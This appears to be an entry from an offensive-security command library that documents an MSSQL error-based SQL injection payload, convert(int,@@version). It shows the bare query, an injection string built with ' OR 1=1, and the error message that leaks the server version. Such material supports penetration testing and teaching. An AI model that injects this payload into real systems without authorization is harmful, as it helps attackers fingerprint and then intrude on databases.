---
id: f078383e-198a-4d07-8461-c5c90fb4c3c6
name: convert-int-@@version
type: command
executor: sql
data: 'convert(int,@@version)'
output: null
created_at: '2023-04-06T03:56:33.815867+00:00'
updated_at: '2023-04-10T20:22:41.312777+00:00'
platforms:
  - Windows
  - MSSQL
tags:
  - sql-injection
  - error-based
verified: true
validated: true
---

# convert-int-@@version

## Command

```sql
convert(int,@@version)
```

## Description

This SQL command attempts to convert the MSSQL server version string (from @@version) to an integer, which fails and generates an error message revealing the full version details. Use in error-based SQL injection payloads for integer-expecting parameters to extract system information.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| @@version | MSSQL system variable holding the server version string | Yes (built-in) |
| int | Target data type for conversion | Yes (built-in) |

## Examples

### Basic Usage

In a direct query:

```sql
SELECT convert(int,@@version)
```

### In Injection Payload

Appended to a vulnerable query:

```sql
' OR 1=1; convert(int,@@version)--
```

## Expected Output

Error message: "Conversion failed when converting the varchar value 'Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)' to data type int." The version is leaked in the varchar value.

## Related

- [[procedures/MSSQL-Error-Based-Injection-to-Extract-Version]]
- [[commands/cast-int-@@version]]
